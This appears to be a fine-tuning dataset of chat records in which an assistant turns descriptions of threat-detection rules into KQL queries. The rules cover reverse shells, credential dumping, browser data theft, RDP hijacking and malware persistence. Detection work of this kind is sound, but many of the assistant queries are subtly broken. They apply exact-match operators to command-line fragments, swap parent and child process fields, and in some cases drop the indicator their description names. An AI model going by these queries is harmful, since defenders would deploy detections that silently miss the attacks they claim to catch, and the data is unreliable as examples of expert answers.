{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of electron apps (teams, discord, slack, etc.). This could be a potential sign of \".asar\" file tampering (See reference section for more information) or binary execution proxy through specific CLI arguments (see related rule)\n Topic: proc_creation_win_susp_electron_app_children"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\chrome.exe\", \"\\\\discord.exe\", \"\\\\GitHubDesktop.exe\", \"\\\\keybase.exe\", \"\\\\msedge.exe\", \"\\\\msedgewebview2.exe\", \"\\\\msteams.exe\", \"\\\\slack.exe\", \"\\\\teams.exe\")) and ((InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\whoami.exe\", \"\\\\wscript.exe\")) or (FolderPath contains \":\\\\ProgramData\\\\\" or FolderPath contains \":\\\\Temp\\\\\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or FolderPath contains \"\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\Windows\\\\Temp\\\\\")) and (not((InitiatingProcessFileName =~ \"\\\\Discord.exe\" and ProcessCommandLine =~ \"\\\\NVSMI\\\\nvidia-smi.exe\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of curl.exe with custom useragent options Topic: proc_creation_win_curl_useragent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoProductName =~ \"The curl executable\") and (ProcessCommandLine in~ (\" -A \", \" --user-agent \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects child processes of the \"Trace log generation tool for Media Foundation Tools\" (Mftrace.exe) which can abused to execute arbitrary binaries. Topic: proc_creation_win_mftrace_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\mftrace.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects default lsass dump filename generated by SafetyKatz. Topic: file_event_win_hktl_safetykatz"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Temp\\\\debug.bin\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects exploitation of DNS RCE bug reported in CVE-2020-1350 by the detection of suspicious sub process Topic: proc_creation_win_exploit_cve_2020_1350"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\System32\\\\dns.exe\" and (not((InitiatingProcessFolderPath in~ (\"\\\\System32\\\\werfault.exe\", \"\\\\System32\\\\conhost.exe\", \"\\\\System32\\\\dnscmd.exe\", \"\\\\System32\\\\dns.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of system utilities such as \"find\", \"tree\", \"findmnt\", etc, to discover files, directories and network shares.\n Topic: proc_creation_lnx_file_and_directory_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine matches regex \"(.){200,}\" and InitiatingProcessFolderPath =~ \"/file\") or InitiatingProcessFolderPath =~ \"/find\" or InitiatingProcessFolderPath =~ \"/findmnt\" or InitiatingProcessFolderPath =~ \"/mlocate\" or (ProcessCommandLine =~ \"-R\" and InitiatingProcessFolderPath =~ \"/ls\") or InitiatingProcessFolderPath =~ \"/tree\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon \"userinit.exe\" child processes, which could be a sign of uncommon shells or login scripts used for persistence. Topic: proc_creation_win_userinit_uncommon_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\userinit.exe\" and (not(InitiatingProcessFolderPath =~ \":\\\\WINDOWS\\\\explorer.exe\")) and (not(((InitiatingProcessFolderPath in~ (\":\\\\Program Files (x86)\\\\Citrix\\\\HDX\\\\bin\\\\cmstart.exe\", \":\\\\Program Files (x86)\\\\Citrix\\\\HDX\\\\bin\\\\icast.exe\", \":\\\\Program Files (x86)\\\\Citrix\\\\System32\\\\icast.exe\", \":\\\\Program Files\\\\Citrix\\\\HDX\\\\bin\\\\cmstart.exe\", \":\\\\Program Files\\\\Citrix\\\\HDX\\\\bin\\\\icast.exe\", \":\\\\Program Files\\\\Citrix\\\\System32\\\\icast.exe\")) or isnull(FolderPath) or (ProcessCommandLine in~ (\"netlogon.bat\", \"UsrLogon.cmd\")) or (InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\System32\\\\proquota.exe\", \":\\\\Windows\\\\SysWOW64\\\\proquota.exe\")) or ProcessCommandLine =~ \"PowerShell.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report. Topic: proc_creation_win_ssm_agent_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-register \", \"-code \", \"-id \", \"-region \")) and InitiatingProcessFolderPath =~ \"\\\\amazon-ssm-agent.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Powerup tools Write Hijack DLL exploits DLL hijacking for privilege escalation.\nIn its default mode, it builds a self deleting .bat file which executes malicious command.\nThe detection rule relies on creation of the malicious bat file (debug.bat by default).\n Topic: file_event_win_hktl_powerup_dllhijacking"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".bat\" and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in. Topic: proc_creation_win_cmd_mklink_osk_cmd"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"mklink\", \"\\\\osk.exe\", \"\\\\cmd.exe\")) and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the Kapeka Backdoor binary being loaded by rundll32.exe.\nThe Kapeka loader drops a backdoor, which is a DLL with the .wll extension masquerading as a Microsoft Word Add-In.\n Topic: image_load_malware_kapeka_backdoor_wll"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath contains \":\\\\ProgramData\" or FolderPath contains \"\\\\AppData\\\\Local\\\\\") and FolderPath matches regex \"[a-zA-Z]{5,6}\\\\.wll\" and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "F-Secure C3 produces DLLs with a default exported StartNodeRelay function. Topic: proc_creation_win_hktl_c3_rundll32_pattern"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"rundll32.exe\", \".dll\", \"StartNodeRelay\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects chmod targeting files in abnormal directory paths. Topic: proc_creation_lnx_susp_chmod_directories"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/tmp/\", \"/.Library/\", \"/etc/\", \"/opt/\")) and InitiatingProcessFolderPath =~ \"/chmod\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"cmd\", \"powershell\" or \"powershell_ise\" binary. Attackers were seen using these binaries in a renamed form as \"wermgr.exe\" in exploitation of CVE-2023-36874 Topic: proc_creation_win_exploit_cve_2023_36874_fake_wermgr"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"powershell_ise.EXE\", \"powershell.exe\")) and InitiatingProcessFolderPath =~ \"\\\\wermgr.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious powershell invocations from interpreters or unusual programs Topic: proc_creation_win_powershell_script_engine_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\wscript.exe\", \"\\\\cscript.exe\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) and (not(InitiatingProcessFolderPath =~ \"\\\\Health Service State\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the modification of the PortProxy registry key which is used for port forwarding. Topic: registry_event_portproxy_registry_key"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Services\\\\PortProxy\\\\v4tov4\\\\tcp*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects RDP session hijacking by using MSTSC shadowing Topic: proc_creation_win_mstsc_rdp_hijack_shadowing"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"noconsentprompt\", \"shadow:\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys Topic: proc_creation_win_reg_susp_paths"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\AppDataLow\\\\Software\\\\Microsoft\\\\\", \"\\\\Policies\\\\Microsoft\\\\Windows\\\\OOBE\", \"\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\", \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\Currentversion\\\\Winlogon\", \"\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest\", \"\\\\Microsoft\\\\Windows Defender\\\\\")) and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space. Topic: proc_creation_win_svchost_execution_with_no_cli_flags"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"svchost.exe\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\") and (not(((InitiatingProcessFolderPath endswith \"\\\\rpcnet.exe\" or InitiatingProcessFolderPath endswith \"\\\\rpcnetp.exe\") or isnull(ProcessCommandLine))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics Topic: proc_creation_win_msra_process_injection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"msra.exe\" and InitiatingProcessFileName =~ \"\\\\msra.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\arp.exe\", \"\\\\cmd.exe\", \"\\\\net.exe\", \"\\\\netstat.exe\", \"\\\\nslookup.exe\", \"\\\\route.exe\", \"\\\\schtasks.exe\", \"\\\\whoami.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to enable the guest account using the sysadminctl utility Topic: proc_creation_macos_sysadminctl_enable_guest_account"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -guestAccount\", \" on\")) and InitiatingProcessFolderPath =~ \"/sysadminctl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process tree behavior of a \"rundll32\" execution where the DLL doesnt have the \".dll\" extension. This is often linked with potential Qakbot activity. Topic: proc_creation_win_malware_qakbot_rundll32_fake_dll_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\curl.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\")) and (ProcessCommandLine in~ (\":\\\\ProgramData\\\\\", \":\\\\Users\\\\Public\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\") and (not(ProcessCommandLine =~ \".dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0 Topic: proc_creation_win_powershell_downgrade_attack"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -version 2 \", \" -versio 2 \", \" -versi 2 \", \" -vers 2 \", \" -ver 2 \", \" -ve 2 \", \" -v 2 \")) and InitiatingProcessFolderPath =~ \"\\\\powershell.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of \"mstsc.exe\" with the \"/v\" flag to initiate a connection to a remote server.\nAdversaries may use valid accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n Topic: proc_creation_win_mstsc_remote_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \" -v:\" or ProcessCommandLine contains \" /v:\" or ProcessCommandLine contains \" \u2013v:\" or ProcessCommandLine contains \" \u2014v:\" or ProcessCommandLine contains \" \u2015v:\") and (FolderPath endswith \"\\\\mstsc.exe\" or ProcessVersionInfoOriginalFileName =~ \"mstsc.exe\")) and (not((InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\lxss\\\\wslhost.exe\" and ProcessCommandLine =~ \"C:\\\\ProgramData\\\\Microsoft\\\\WSL\\\\wslg.rdp\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them.\nThe manifest option enables you to install an application by passing in a YAML file directly to the client.\nWinget can be used to download and install exe, msi or msix files later.\n Topic: proc_creation_win_winget_local_install_via_manifest"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\winget.exe\" or ProcessVersionInfoOriginalFileName =~ \"winget.exe\") and (ProcessCommandLine in~ (\"install\", \" add \")) and (ProcessCommandLine in~ (\"-m \", \"--manifest\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry modifications that change features of internal Windows tools (malware like Agent Tesla uses this technique) Topic: registry_set_disable_function_user"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\StartMenuLogOff\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\DisableChangePassword\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\DisableLockWorkstation\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\DisableRegistryTools\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\DisableTaskmgr\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\NoDispBackgroundPage\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\NoDispCPL\" or RegistryKey endswith \"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Explorer\\\\DisableNotificationCenter\" or RegistryKey endswith \"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\\DisableCMD\") and RegistryValueData =~ \"DWORD (0x00000001)\") or ((RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\ConsentPromptBehaviorAdmin\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\shutdownwithoutlogon\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\PushNotifications\\\\ToastEnabled\" or RegistryKey endswith \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Storage\\\\Write Protection\" or RegistryKey endswith \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\StorageDevicePolicies\\\\WriteProtect\") and RegistryValueData =~ \"DWORD (0x00000000)\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the bash shell with the interactive flag \"-i\". Topic: proc_creation_lnx_bash_interactive_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -i \" and InitiatingProcessFolderPath =~ \"/bash\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes setting a new DLL in DllName in under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nAdversaries may abuse time providers to execute DLLs when the system boots.\nThe Windows Time service (W32Time) enables time synchronization across and within domains.\n Topic: registry_set_timeproviders_dllname"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Services\\\\W32Time\\\\TimeProviders\" and RegistryKey endswith \"\\\\DllName\") and (not((RegistryValueData in~ (\"%SystemRoot%\\\\System32\\\\vmictimeprovider.dll\", \"%systemroot%\\\\system32\\\\w32time.dll\", \"C:\\\\Windows\\\\SYSTEM32\\\\w32time.DLL\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading using ClassicExplorer32.dll from the Classic Shell software Topic: image_load_side_load_classicexplorer32"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\ClassicExplorer32.dll\" and (not(FolderPath startswith \"C:\\\\Program Files\\\\Classic Shell\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects post exploitation execution technique of the Serpent backdoor.\nAccording to Proofpoint, one of the commands that the backdoor ran was via creating a temporary scheduled task using an unusual method.\nIt creates a fictitious windows event and a trigger in which once the event is created, it executes the payload.\n Topic: proc_creation_win_malware_serpent_backdoor_payload_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"[System/EventID=\", \"/create\", \"/delete\", \"/ec\", \"/so\", \"/tn run\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs. Topic: win_security_wmi_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"subscription\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects using Rpcping.exe to send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. Topic: proc_creation_win_rpcping_credential_capture"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\rpcping.exe\" and (ProcessCommandLine contains \"-s\" or ProcessCommandLine contains \"/s\" or ProcessCommandLine contains \"\u2013s\" or ProcessCommandLine contains \"\u2014s\" or ProcessCommandLine contains \"\u2015s\") and (((ProcessCommandLine contains \"-u\" or ProcessCommandLine contains \"/u\" or ProcessCommandLine contains \"\u2013u\" or ProcessCommandLine contains \"\u2014u\" or ProcessCommandLine contains \"\u2015u\") and (ProcessCommandLine contains \"NTLM\")) or ((ProcessCommandLine contains \"-t\" or ProcessCommandLine contains \"/t\" or ProcessCommandLine contains \"\u2013t\" or ProcessCommandLine contains \"\u2014t\" or ProcessCommandLine contains \"\u2015t\") and (ProcessCommandLine contains \"ncacn_np\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n Topic: image_load_dll_rstrtmgr_uncommon_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\RstrtMgr.dll\" or InitiatingProcessVersionInfoOriginalFileName =~ \"RstrtMgr.dll\") and (not((InitiatingProcessFolderPath contains \":\\\\Windows\\\\Temp\\\\\" or (InitiatingProcessFolderPath contains \":\\\\$WINDOWS.~BT\\\\\" or InitiatingProcessFolderPath contains \":\\\\$WinREAgent\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\\" or InitiatingProcessFolderPath contains \":\\\\ProgramData\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\explorer.exe\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\SoftwareDistribution\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\SysNative\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\System32\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\SysWOW64\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\WinSxS\\\\\" or InitiatingProcessFolderPath contains \":\\\\WUDownloadCache\\\\\") or ((InitiatingProcessFolderPath contains \":\\\\Users\\\\\" and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\is-\" and InitiatingProcessFolderPath contains \".tmp\\\\\") and InitiatingProcessFolderPath =~ \".tmp\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n Topic: proc_creation_lnx_php_reverse_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"/php\" and (ProcessCommandLine in~ (\"ash\", \"bash\", \"bsh\", \"csh\", \"ksh\", \"pdksh\", \"sh\", \"tcsh\", \"zsh\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing. Topic: proc_creation_win_sqlite_chromium_profile_data"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\User Data\\\\\", \"\\\\Opera Software\\\\\", \"\\\\ChromiumViewer\\\\\")) and (ProcessCommandLine in~ (\"Login Data\", \"Cookies\", \"Web Data\", \"History\", \"Bookmarks\")) and (ProcessVersionInfoProductName =~ \"SQLite\" or (FolderPath endswith \"\\\\sqlite.exe\" or FolderPath endswith \"\\\\sqlite3.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of IOX - a tool for port forwarding and intranet proxy purposes Topic: proc_creation_win_pua_iox"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\iox.exe\" or (ProcessCommandLine in~ (\".exe fwd -l \", \".exe fwd -r \", \".exe proxy -l \", \".exe proxy -r \")) or (MD5 startswith \"9DB2D314DD3F704A02051EF5EA210993\" or SHA1 startswith \"039130337E28A6623ECF9A0A3DA7D92C5964D8DD\" or SHA256 startswith \"C6CF82919B809967D9D90EA73772A8AA1C1EB3BC59252D977500F64F1A0D6731\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the command line executed when TeamViewer starts a session started by a remote host.\nOnce a connection has been started, an investigator can verify the connection details by viewing the \"incoming_connections.txt\" log file in the TeamViewer folder.\n Topic: proc_creation_lnx_remote_access_tools_teamviewer_incoming_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \"/TeamViewer_Desktop --IPCport 5939 --Module 1\" and InitiatingProcessFileName =~ \"/TeamViewer_Service\" and InitiatingProcessFolderPath =~ \"/TeamViewer_Desktop\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of PDQ Deploy remote admin tool Topic: proc_creation_win_pdqdeploy_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"PDQ Deploy Console\" or ProcessVersionInfoProductName =~ \"PDQ Deploy\" or ProcessVersionInfoCompanyName =~ \"PDQ.com\" or ProcessVersionInfoOriginalFileName =~ \"PDQDeployConsole.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not Topic: proc_creation_win_reg_add_safeboot"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" copy \", \" add \")) and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\") and ProcessCommandLine =~ \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects using WorkFolders.exe to execute an arbitrary control.exe Topic: proc_creation_win_susp_workfolders"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\WorkFolders.exe\" and InitiatingProcessFolderPath =~ \"\\\\control.exe\") and (not(FolderPath =~ \"C:\\\\Windows\\\\System32\\\\control.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"Winlogon\" registry key where a process will set the value of the \"Shell\" to a value that was observed being used by KamiKakaBot samples in order to achieve persistence.\n Topic: registry_set_malware_kamikakabot_winlogon_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell\" and (RegistryValueData contains \"-nop -w h\" and RegistryValueData contains \"$env\" and RegistryValueData contains \"explorer.exe\" and RegistryValueData contains \"Start-Process\")"}]}
